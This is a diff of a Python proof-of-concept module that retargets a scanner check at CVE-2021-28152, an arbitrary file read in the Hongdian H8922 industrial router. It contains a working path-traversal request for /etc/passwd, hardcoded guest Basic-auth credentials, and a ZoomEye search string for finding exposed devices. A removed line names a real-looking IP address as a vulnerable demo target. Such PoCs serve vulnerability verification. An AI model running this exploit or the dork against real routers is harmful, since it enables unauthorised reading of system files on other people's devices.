@@ -10,27 +10,26 @@ class POC(POCBase):
 
     _info = {
         "author" : "jijue",                      # POC作者
-        "version" : "2",                    # POC版本，默认是1  
+        "version" : "1",                    # POC版本，默认是1  
         "CreateDate" : "2021-06-09",        # POC创建时间
         "UpdateDate" : "2021-06-09",        # POC创建时间
         "PocDesc" : """
-            v2 考虑到RG-ISC的账号密码泄露几乎一模一样，
-            只有返回时的部分字段存在出入，此版本做了小小的修改
+            笔者没有zoomeye高级账号，所以就没测试了，换而言之，该POC不一定靠谱  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "锐捷RG-UAC/RG-ISG统一上网行为管理审计系统存在账号密码信息泄露",                        # 漏洞名称
-        "VulnID" : "CNVD-2021-14536",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "锐捷RG-UAC统一上网行为管理审计系统",                     # 漏洞应用名称
+        "name" : "宏电 H8922 后台任意文件读取漏洞",                        # 漏洞名称
+        "VulnID" : "CVE-2021-28152",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "宏电 H8922",                     # 漏洞应用名称
         "AppVersion" : "",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-            锐捷RG-UAC/RG-ISG统一上网行为管理审计系统存在账号密码信息泄露,可以间接获取用户账号密码信息登录后台
+            宏电 H8922 后台存在任意文件读取漏洞，低权限用户通过漏洞可以获取任意文件内容
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            title="RG-UAC登录页面"
+            zoomeye dork : app:"Hongdian H8922 Industrial Router"
         """,                     # fofa搜索语句
-        "example" : "https://60.2.178.226:1443",                     # 存在漏洞的演示url，写一个就可以了
+        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
     }
 
@@ -43,11 +42,12 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "" # url自己按需调整
+        url = self.target + "/log_download.cgi?type=../../etc/passwd" # url自己按需调整
         
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
+                    "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q=",
                     # "Content-Type": "application/x-www-form-urlencoded",
                     }
         
@@ -56,7 +56,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if "pre_define" in req.text and "name" in req.text and "password" in req.text:#req.status_code == 200 and :
+            if "root:" in req.text and req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
